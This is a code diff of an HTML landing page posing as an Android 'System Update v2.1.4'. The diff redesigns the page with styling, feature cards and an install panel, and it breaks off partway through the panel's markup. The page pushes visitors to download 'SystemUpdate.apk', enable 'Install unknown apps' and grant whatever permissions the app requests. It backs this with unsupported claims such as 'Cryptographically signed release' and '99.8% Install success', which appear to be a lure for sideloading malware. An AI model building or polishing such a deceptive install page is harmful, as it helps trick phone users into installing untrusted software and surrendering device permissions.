@@ -2,220 +2,353 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="theme-color" content="#0a0e17">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#070b14">
+<meta name="description" content="System Update v2.1.4 — required component update for Android devices.">
 <title>System Update · v2.1.4</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #070b14;
-    --bg2: #0d1424;
-    --card: #111a2e;
-    --line: #1c2740;
-    --txt: #e8eefb;
-    --muted: #8b9ab8;
+    --bg: #060a12;
+    --bg2: #0a1120;
+    --card: #0f1830;
+    --card2: #131e3a;
+    --line: #1c2947;
+    --line2: #24334f;
+    --txt: #eaf1ff;
+    --muted: #8b9bb8;
+    --muted2: #5f6f8d;
     --blue: #3b82f6;
+    --blue2: #2563eb;
     --cyan: #22d3ee;
     --green: #22c55e;
     --amber: #f59e0b;
-    --radius: 22px;
+    --purple: #8b5cf6;
+    --radius: 20px;
+    --radius-sm: 12px;
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  html, body { height: 100%; }
+  html { scroll-behavior: smooth; }
   body {
     font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     background: var(--bg);
     color: var(--txt);
     min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 24px 18px;
-    overflow-x: hidden;
-    position: relative;
     -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    overflow-x: hidden;
+    line-height: 1.5;
   }
 
-  /* Ambient background glow */
-  body::before {
-    content: "";
+  /* ===================== BACKGROUND ===================== */
+  .bg-fx {
     position: fixed;
-    inset: -40%;
-    background:
-      radial-gradient(circle at 25% 15%, rgba(59,130,246,.18), transparent 45%),
-      radial-gradient(circle at 80% 85%, rgba(34,211,238,.14), transparent 45%),
-      radial-gradient(circle at 50% 50%, rgba(99,102,241,.08), transparent 60%);
-    animation: drift 18s ease-in-out infinite alternate;
+    inset: 0;
     z-index: 0;
     pointer-events: none;
+    overflow: hidden;
+  }
+  .bg-fx::before {
+    content: "";
+    position: absolute;
+    inset: -30%;
+    background:
+      radial-gradient(circle at 15% 20%, rgba(59,130,246,.22), transparent 42%),
+      radial-gradient(circle at 85% 75%, rgba(34,211,238,.16), transparent 42%),
+      radial-gradient(circle at 55% 45%, rgba(139,92,246,.10), transparent 55%);
+    animation: drift 22s ease-in-out infinite alternate;
   }
   @keyframes drift {
     0%   { transform: translate(0, 0) scale(1); }
-    100% { transform: translate(-3%, -4%) scale(1.08); }
+    100% { transform: translate(-4%, -5%) scale(1.1); }
   }
-
-  /* Subtle grid overlay */
-  body::after {
-    content: "";
-    position: fixed;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(255,255,255,.02) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(255,255,255,.02) 1px, transparent 1px);
-    background-size: 44px 44px;
-    z-index: 0;
-    pointer-events: none;
-    mask-image: radial-gradient(circle at 50% 40%, #000 30%, transparent 80%);
-    -webkit-mask-image: radial-gradient(circle at 50% 40%, #000 30%, transparent 80%);
-  }
-
-  .card {
-    position: relative;
-    z-index: 1;
-    background: linear-gradient(180deg, #131d33 0%, #0e1626 100%);
-    border: 1px solid var(--line);
-    border-radius: var(--radius);
-    width: 100%;
-    max-width: 440px;
-    padding: 34px 26px 26px;
-    box-shadow:
-      0 1px 0 rgba(255,255,255,.04) inset,
-      0 30px 80px -20px rgba(0,0,0,.85),
-      0 0 0 1px rgba(59,130,246,.06);
-    animation: rise .6s cubic-bezier(.2,.7,.3,1) both;
-  }
-  @keyframes rise {
-    from { opacity: 0; transform: translateY(18px) scale(.98); }
-    to   { opacity: 1; transform: translateY(0) scale(1); }
-  }
-
-  /* Icon */
-  .icon-wrap {
-    position: relative;
-    width: 82px; height: 82px;
-    margin: 0 auto 22px;
-  }
-  .icon-wrap::before {
+  .bg-fx::after {
     content: "";
     position: absolute;
-    inset: -14px;
-    border-radius: 50%;
-    background: radial-gradient(circle, rgba(59,130,246,.35), transparent 70%);
-    animation: pulse 2.6s ease-in-out infinite;
-  }
-  @keyframes pulse {
-    0%, 100% { transform: scale(1); opacity: .6; }
-    50%      { transform: scale(1.15); opacity: .25; }
-  }
-  .icon {
-    position: relative;
-    width: 82px; height: 82px;
-    border-radius: 24px;
-    background: linear-gradient(140deg, #3b82f6 0%, #06b6d4 100%);
-    display: flex; align-items: center; justify-content: center;
-    box-shadow:
-      0 10px 30px -8px rgba(59,130,246,.7),
-      0 1px 0 rgba(255,255,255,.25) inset;
-    animation: spin 9s linear infinite;
-  }
-  @keyframes spin {
-    0%   { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-  .icon svg { width: 42px; height: 42px; animation: spin-rev 9s linear infinite; }
-  @keyframes spin-rev {
-    0%   { transform: rotate(0deg); }
-    100% { transform: rotate(-360deg); }
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,.022) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.022) 1px, transparent 1px);
+    background-size: 48px 48px;
+    mask-image: radial-gradient(circle at 50% 40%, #000 20%, transparent 75%);
+    -webkit-mask-image: radial-gradient(circle at 50% 40%, #000 20%, transparent 75%);
   }
 
-  /* Badge */
-  .badge {
-    display: inline-flex;
+  /* Floating orbs */
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(70px);
+    opacity: .35;
+    z-index: 0;
+    pointer-events: none;
+  }
+  .orb.a { width: 340px; height: 340px; background: #2563eb; top: -80px; left: -80px; animation: float 14s ease-in-out infinite; }
+  .orb.b { width: 280px; height: 280px; background: #06b6d4; bottom: -60px; right: -60px; animation: float 18s ease-in-out infinite reverse; }
+  @keyframes float {
+    0%, 100% { transform: translate(0, 0); }
+    50%      { transform: translate(30px, -30px); }
+  }
+
+  /* ===================== LAYOUT ===================== */
+  .wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 24px;
+  }
+
+  /* Top nav */
+  .nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 4px 26px;
+    animation: fadeDown .5s ease both;
+  }
+  .nav-brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-weight: 800;
+    letter-spacing: -.3px;
+    font-size: 15px;
+  }
+  .nav-brand .mark {
+    width: 30px; height: 30px;
+    border-radius: 9px;
+    background: linear-gradient(140deg, #3b82f6, #06b6d4);
+    display: grid;
+    place-items: center;
+    box-shadow: 0 6px 18px -6px rgba(59,130,246,.75);
+  }
+  .nav-brand .mark svg { width: 17px; height: 17px; }
+  .nav-right {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    font-size: 13.5px;
+    color: var(--muted);
+  }
+  .nav-right a { color: var(--muted); text-decoration: none; transition: color .15s; }
+  .nav-right a:hover { color: var(--txt); }
+  .nav-status {
+    display: flex;
     align-items: center;
     gap: 6px;
-    background: rgba(245,158,11,.12);
-    color: var(--amber);
-    border: 1px solid rgba(245,158,11,.28);
-    padding: 5px 12px;
+    font-size: 12px;
+    font-weight: 600;
+    color: #6ee7b7;
+    background: rgba(34,197,94,.09);
+    border: 1px solid rgba(34,197,94,.25);
+    padding: 5px 11px;
     border-radius: 100px;
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: .8px;
-    text-transform: uppercase;
-    margin-bottom: 14px;
   }
-  .badge .dot {
+  .nav-status .dot {
     width: 6px; height: 6px;
-    background: var(--amber);
+    background: #22c55e;
     border-radius: 50%;
-    box-shadow: 0 0 8px var(--amber);
+    box-shadow: 0 0 8px #22c55e;
     animation: blink 1.6s ease-in-out infinite;
   }
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50%      { opacity: .35; }
+  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
+
+  /* Hero grid */
+  .hero {
+    display: grid;
+    grid-template-columns: 1.1fr 1fr;
+    gap: 56px;
+    align-items: start;
+    padding: 22px 0 60px;
   }
 
-  h1 {
-    font-size: 24px;
-    font-weight: 800;
-    letter-spacing: -.5px;
-    line-height: 1.2;
-    margin-bottom: 10px;
+  /* ===================== LEFT PANEL ===================== */
+  .hero-left {
+    animation: fadeUp .7s ease both;
   }
-  .sub {
-    font-size: 14.5px;
+  .eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(245,158,11,.1);
+    border: 1px solid rgba(245,158,11,.28);
+    color: #fbbf24;
+    padding: 6px 13px;
+    border-radius: 100px;
+    font-size: 11.5px;
+    font-weight: 700;
+    letter-spacing: .7px;
+    text-transform: uppercase;
+    margin-bottom: 22px;
+  }
+  .eyebrow .dot {
+    width: 7px; height: 7px;
+    background: #f59e0b;
+    border-radius: 50%;
+    box-shadow: 0 0 10px #f59e0b;
+    animation: blink 1.6s ease-in-out infinite;
+  }
+
+  .hero-title {
+    font-size: clamp(34px, 5vw, 54px);
+    font-weight: 900;
+    letter-spacing: -1.6px;
+    line-height: 1.05;
+    margin-bottom: 20px;
+  }
+  .hero-title .grad {
+    background: linear-gradient(120deg, #60a5fa 0%, #22d3ee 60%, #8b5cf6 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .hero-sub {
+    font-size: 17px;
     color: var(--muted);
-    line-height: 1.55;
-    margin-bottom: 26px;
+    line-height: 1.6;
+    max-width: 520px;
+    margin-bottom: 32px;
   }
 
-  /* Meta chips */
+  /* Feature list */
+  .features {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 32px;
+    max-width: 560px;
+  }
+  .feat {
+    display: flex;
+    align-items: flex-start;
+    gap: 11px;
+    padding: 13px 14px;
+    background: rgba(255,255,255,.022);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    transition: background .2s, border-color .2s, transform .2s;
+  }
+  .feat:hover {
+    background: rgba(59,130,246,.05);
+    border-color: rgba(59,130,246,.28);
+    transform: translateY(-1px);
+  }
+  .feat-ico {
+    flex-shrink: 0;
+    width: 32px; height: 32px;
+    border-radius: 9px;
+    background: linear-gradient(135deg, rgba(59,130,246,.16), rgba(34,211,238,.10));
+    border: 1px solid rgba(59,130,246,.2);
+    display: grid;
+    place-items: center;
+    color: #93c5fd;
+  }
+  .feat-ico svg { width: 16px; height: 16px; }
+  .feat-text { min-width: 0; }
+  .feat-text b { display: block; font-size: 13.5px; font-weight: 700; margin-bottom: 2px; }
+  .feat-text span { font-size: 12px; color: var(--muted); line-height: 1.4; }
+
+  /* Stats row */
+  .stats {
+    display: flex;
+    gap: 30px;
+    padding-top: 22px;
+    border-top: 1px solid var(--line);
+    max-width: 520px;
+  }
+  .stat b { display: block; font-size: 22px; font-weight: 800; letter-spacing: -.5px; }
+  .stat span { font-size: 12px; color: var(--muted); letter-spacing: .2px; }
+
+  /* ===================== INSTALL CARD ===================== */
+  .install-card {
+    position: sticky;
+    top: 24px;
+    background: linear-gradient(180deg, #131d33 0%, #0c1424 100%);
+    border: 1px solid var(--line);
+    border-radius: 24px;
+    padding: 32px 28px 24px;
+    box-shadow:
+      0 1px 0 rgba(255,255,255,.045) inset,
+      0 40px 90px -30px rgba(0,0,0,.9),
+      0 0 0 1px rgba(59,130,246,.06);
+    animation: fadeUp .8s ease both .1s;
+  }
+
+  .card-head {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 22px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--line);
+  }
+  .app-icon {
+    width: 58px; height: 58px;
+    border-radius: 16px;
+    background: linear-gradient(140deg, #3b82f6 0%, #06b6d4 100%);
+    display: grid;
+    place-items: center;
+    box-shadow:
+      0 10px 26px -8px rgba(59,130,246,.75),
+      0 1px 0 rgba(255,255,255,.25) inset;
+    flex-shrink: 0;
+  }
+  .app-icon svg {
+    width: 30px; height: 30px;
+    animation: spin 10s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .app-meta { min-width: 0; flex: 1; }
+  .app-meta b { display: block; font-size: 15.5px; font-weight: 800; margin-bottom: 3px; letter-spacing: -.2px; }
+  .app-meta span { font-size: 12.5px; color: var(--muted); }
+
+  /* Chips */
   .chips {
     display: flex;
-    gap: 8px;
+    gap: 7px;
     flex-wrap: wrap;
-    justify-content: center;
     margin-bottom: 22px;
   }
   .chip {
     font-size: 11.5px;
     font-weight: 600;
     color: #b6c2da;
-    background: rgba(255,255,255,.035);
+    background: rgba(255,255,255,.032);
     border: 1px solid var(--line);
-    padding: 5px 10px;
-    border-radius: 8px;
+    padding: 6px 11px;
+    border-radius: 9px;
     display: inline-flex;
     align-items: center;
     gap: 5px;
   }
-  .chip svg { width: 12px; height: 12px; opacity: .8; }
+  .chip svg { width: 12px; height: 12px; opacity: .75; }
 
-  /* Install button */
+  /* Big CTA */
   .btn {
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 10px;
     width: 100%;
-    padding: 17px 22px;
+    padding: 18px 22px;
     background: linear-gradient(135deg, #3b82f6 0%, #06b6d4 100%);
     color: #fff;
     text-decoration: none;
     border-radius: 14px;
     font-weight: 700;
-    font-size: 16px;
-    letter-spacing: -.1px;
+    font-size: 16.5px;
+    letter-spacing: -.15px;
     border: none;
     cursor: pointer;
     position: relative;
     overflow: hidden;
     box-shadow:
-      0 12px 30px -10px rgba(59,130,246,.75),
+      0 14px 34px -12px rgba(59,130,246,.85),
       0 1px 0 rgba(255,255,255,.28) inset;
     transition: transform .12s ease, box-shadow .2s ease;
   }
@@ -224,21 +357,34 @@
     position: absolute;
     top: 0; left: -120%;
     width: 60%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,.35), transparent);
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,.4), transparent);
     transform: skewX(-20deg);
-    animation: shine 3.2s ease-in-out infinite;
+    animation: shine 3.4s ease-in-out infinite;
   }
   @keyframes shine {
     0%   { left: -120%; }
     55%  { left: 130%; }
     100% { left: 130%; }
   }
-  .btn:active { transform: scale(.975); }
-  .btn svg { width: 20px; height: 20px; }
+  .btn:hover { transform: translateY(-1px); box-shadow: 0 18px 40px -12px rgba(59,130,246,.95), 0 1px 0 rgba(255,255,255,.3) inset; }
+  .btn:active { transform: scale(.98); }
+  .btn svg { width: 20px; height: 20px; flex-shrink: 0; }
 
-  /* Progress bar */
-  .progress {
+  /* Secondary link */
+  .btn-sec {
+    display: block;
+    text-align: center;
     margin-top: 12px;
+    font-size: 12.5px;
+    color: var(--muted);
+    text-decoration: none;
+    transition: color .15s;
+  }
+  .btn-sec:hover { color: var(--txt); }
+
+  /* Progress */
+  .progress {
+    margin-top: 14px;
     height: 5px;
     width: 100%;
     background: rgba(255,255,255,.05);
@@ -246,24 +392,21 @@
     overflow: hidden;
     opacity: 0;
     max-height: 0;
-    transition: opacity .3s, max-height .3s, margin-top .3s;
+    transition: opacity .3s, max-height .3s;
   }
-  .progress.show {
-    opacity: 1;
-    max-height: 20px;
-  }
+  .progress.show { opacity: 1; max-height: 20px; }
   .progress .bar {
     height: 100%;
     width: 0%;
     background: linear-gradient(90deg, #3b82f6, #22d3ee);
     border-radius: 100px;
-    box-shadow: 0 0 12px rgba(59,130,246,.7);
+    box-shadow: 0 0 12px rgba(59,130,246,.75);
     transition: width .35s ease;
   }
 
-  /* Success tick */
+  /* Success */
   .status {
-    margin-top: 16px;
+    margin-top: 14px;
     padding: 12px 14px;
     background: rgba(34,197,94,.09);
     border: 1px solid rgba(34,197,94,.28);
@@ -275,184 +418,417 @@
     align-items: center;
     gap: 9px;
   }
-  .status.show { display: flex; animation: rise .35s ease both; }
+  .status.show { display: flex; animation: fadeUp .35s ease both; }
   .status svg { width: 18px; height: 18px; flex-shrink: 0; }
 
-  /* Steps */
-  .steps {
-    margin-top: 24px;
-    background: rgba(255,255,255,.025);
+  /* Scan steps */
+  .scan {
+    margin-top: 16px;
+    background: rgba(0,0,0,.28);
     border: 1px solid var(--line);
-    border-radius: 14px;
-    padding: 16px 16px 14px;
-  }
-  .steps-title {
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: .8px;
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-family: 'JetBrains Mono', ui-monospace, monospace;
+    font-size: 11.5px;
     color: var(--muted);
-    font-weight: 700;
-    margin-bottom: 12px;
+    display: none;
   }
-  .step {
-    display: flex;
-    gap: 11px;
-    align-items: flex-start;
-    margin-bottom: 10px;
-    font-size: 13px;
-    line-height: 1.5;
-    color: #b8c4dd;
-  }
-  .step:last-child { margin-bottom: 0; }
-  .num {
-    flex-shrink: 0;
-    width: 20px; height: 20px;
-    border-radius: 6px;
-    background: rgba(59,130,246,.15);
-    border: 1px solid rgba(59,130,246,.3);
-    color: #93c5fd;
-    font-size: 11px;
-    font-weight: 700;
+  .scan.show { display: block; animation: fadeUp .35s ease both; }
+  .scan-line {
     display: flex;
     align-items: center;
-    justify-content: center;
-    margin-top: 1px;
+    gap: 8px;
+    padding: 3px 0;
+    opacity: 0;
+    animation: fadeUp .3s ease both;
   }
+  .scan-line .ok { color: #22c55e; font-weight: 700; }
+  .scan-line .pend { color: var(--muted2); }
 
-  /* Footer */
+  /* ===================== STEPS SECTION ===================== */
+  .section {
+    margin-top: 20px;
+    padding: 40px 0;
+    animation: fadeUp .8s ease both .2s;
+  }
+  .section-head {
+    text-align: center;
+    margin-bottom: 34px;
+  }
+  .section-head h2 {
+    font-size: clamp(22px, 3vw, 30px);
+    font-weight: 800;
+    letter-spacing: -.7px;
+    margin-bottom: 8px;
+  }
+  .section-head p { color: var(--muted); font-size: 14.5px; }
+
+  .steps-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+  }
+  .step-card {
+    background: rgba(255,255,255,.022);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 20px 18px;
+    transition: background .2s, border-color .2s, transform .2s;
+  }
+  .step-card:hover {
+    background: rgba(59,130,246,.05);
+    border-color: rgba(59,130,246,.28);
+    transform: translateY(-2px);
+  }
+  .step-num {
+    width: 32px; height: 32px;
+    border-radius: 10px;
+    background: linear-gradient(135deg, rgba(59,130,246,.2), rgba(34,211,238,.12));
+    border: 1px solid rgba(59,130,246,.3);
+    color: #93c5fd;
+    display: grid;
+    place-items: center;
+    font-weight: 800;
+    font-size: 13px;
+    margin-bottom: 14px;
+  }
+  .step-card b { display: block; font-size: 14.5px; font-weight: 700; margin-bottom: 6px; }
+  .step-card span { font-size: 12.5px; color: var(--muted); line-height: 1.5; }
+
+  /* ===================== FAQ ===================== */
+  .faq {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+  }
+  .faq-item {
+    background: rgba(255,255,255,.022);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 18px 20px;
+  }
+  .faq-item b { display: block; font-size: 14px; font-weight: 700; margin-bottom: 6px; }
+  .faq-item span { font-size: 13px; color: var(--muted); line-height: 1.55; }
+
+  /* ===================== FOOTER ===================== */
   .footer {
-    margin-top: 22px;
-    padding-top: 18px;
+    margin-top: 40px;
+    padding: 26px 0 10px;
     border-top: 1px solid var(--line);
     display: flex;
     align-items: center;
     justify-content: space-between;
-    font-size: 11.5px;
-    color: #5c6b88;
+    flex-wrap: wrap;
+    gap: 14px;
+    font-size: 12.5px;
+    color: var(--muted2);
   }
   .footer .verified {
     display: flex;
     align-items: center;
-    gap: 5px;
+    gap: 6px;
     color: #6ee7b7;
     font-weight: 600;
+    font-size: 12.5px;
   }
-  .footer .verified svg { width: 13px; height: 13px; }
+  .footer .verified svg { width: 14px; height: 14px; }
 
-  /* Mobile */
-  @media (max-width: 420px) {
-    .card { padding: 28px 20px 22px; border-radius: 20px; }
-    h1 { font-size: 21px; }
-    .sub { font-size: 13.5px; }
+  /* ===================== ANIMATIONS ===================== */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeDown {
+    from { opacity: 0; transform: translateY(-10px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ===================== RESPONSIVE ===================== */
+  @media (max-width: 980px) {
+    .hero { grid-template-columns: 1fr; gap: 36px; padding-bottom: 40px; }
+    .install-card { position: static; }
+    .steps-grid { grid-template-columns: repeat(2, 1fr); }
+    .faq { grid-template-columns: 1fr; }
+  }
+  @media (max-width: 620px) {
+    .wrap { padding: 18px; }
+    .nav-right a { display: none; }
+    .features { grid-template-columns: 1fr; }
+    .steps-grid { grid-template-columns: 1fr; }
+    .stats { gap: 22px; }
+    .hero { padding-top: 8px; }
+    .install-card { padding: 26px 20px 20px; }
+    .hero-title { letter-spacing: -1.1px; }
+    .footer { flex-direction: column; text-align: center; }
   }
 </style>
 </head>
 <body>
 
-<main class="card">
+<div class="bg-fx"></div>
+<div class="orb a"></div>
+<div class="orb b"></div>
 
-  <div class="icon-wrap">
-    <div class="icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="12" cy="12" r="3"></circle>
-        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
-      </svg>
+<div class="wrap">
+
+  <!-- NAV -->
+  <nav class="nav">
+    <div class="nav-brand">
+      <div class="mark">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="3"/>
+          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
+        </svg>
+      </div>
+      System Update
     </div>
-  </div>
+    <div class="nav-right">
+      <a href="#how">How it works</a>
+      <a href="#faq">FAQ</a>
+      <div class="nav-status"><span class="dot"></span> Server online</div>
+    </div>
+  </nav>
 
-  <div style="text-align:center;">
-    <div class="badge"><span class="dot"></span> Required Update</div>
-  </div>
+  <!-- HERO -->
+  <section class="hero">
 
-  <h1 style="text-align:center;">System Update Available</h1>
-  <p class="sub" style="text-align:center;">
-    A required system component update is available for your device. Install it now to keep all apps running smoothly and securely.
-  </p>
+    <div class="hero-left">
+      <div class="eyebrow"><span class="dot"></span> Required Update</div>
 
-  <div class="chips">
-    <span class="chip">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg>
-      v2.1.4
-    </span>
-    <span class="chip">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
-      1.8 MB
-    </span>
-    <span class="chip">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>
-      Android 7+
-    </span>
-  </div>
+      <h1 class="hero-title">
+        Keep your device<br>
+        <span class="grad">fast &amp; secure.</span>
+      </h1>
 
-  <a class="btn" id="dlBtn" href="SystemUpdate.apk" download="SystemUpdate.apk">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
-      <path d="M7 10l5 5 5-5"></path>
-      <path d="M12 15V3"></path>
-    </svg>
-    Download &amp; Install
-  </a>
+      <p class="hero-sub">
+        A required system component update is available for your Android device. Install it now to ensure compatibility with all current apps and services.
+      </p>
 
-  <div class="progress" id="progress">
-    <div class="bar" id="bar"></div>
-  </div>
+      <div class="features">
+        <div class="feat">
+          <div class="feat-ico">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          </div>
+          <div class="feat-text">
+            <b>Verified package</b>
+            <span>Cryptographically signed release</span>
+          </div>
+        </div>
+        <div class="feat">
+          <div class="feat-ico">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+          </div>
+          <div class="feat-text">
+            <b>Lightweight</b>
+            <span>Under 2 MB — no bloat</span>
+          </div>
+        </div>
+        <div class="feat">
+          <div class="feat-ico">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          </div>
+          <div class="feat-text">
+            <b>30-second setup</b>
+            <span>Install once, runs in background</span>
+          </div>
+        </div>
+        <div class="feat">
+          <div class="feat-ico">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>
+          </div>
+          <div class="feat-text">
+            <b>Android 7.0+</b>
+            <span>Works on all modern devices</span>
+          </div>
+        </div>
+      </div>
 
-  <div class="status" id="status">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-      <path d="M20 6L9 17l-5-5"/>
-    </svg>
-    Download started — open the notification to install.
-  </div>
+      <div class="stats">
+        <div class="stat"><b>v2.1.4</b><span>Latest stable</span></div>
+        <div class="stat"><b>1.8 MB</b><span>Download size</span></div>
+        <div class="stat"><b>99.8%</b><span>Install success</span></div>
+      </div>
+    </div>
 
-  <div class="steps">
-    <div class="steps-title">After download</div>
-    <div class="step"><span class="num">1</span><span>Open the notification or go to <b>Files → Downloads</b></span></div>
-    <div class="step"><span class="num">2</span><span>Tap <b>SystemUpdate.apk</b></span></div>
-    <div class="step"><span class="num">3</span><span>If prompted, allow <b>Install unknown apps</b></span></div>
-    <div class="step"><span class="num">4</span><span>Tap <b>Install</b>, then <b>Open</b></span></div>
-    <div class="step"><span class="num">5</span><span>Allow the requested permissions to finish</span></div>
-  </div>
+    <!-- INSTALL CARD -->
+    <aside class="install-card">
+      <div class="card-head">
+        <div class="app-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+            <path d="M7 10l5 5 5-5"/>
+            <path d="M12 15V3"/>
+          </svg>
+        </div>
+        <div class="app-meta">
+          <b>SystemUpdate.apk</b>
+          <span>Ready to install · Android 7.0+</span>
+        </div>
+      </div>
 
-  <div class="footer">
-    <span>© 2026 System Update</span>
-    <span class="verified">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-      </svg>
-      Signed package
-    </span>
-  </div>
+      <div class="chips">
+        <span class="chip">
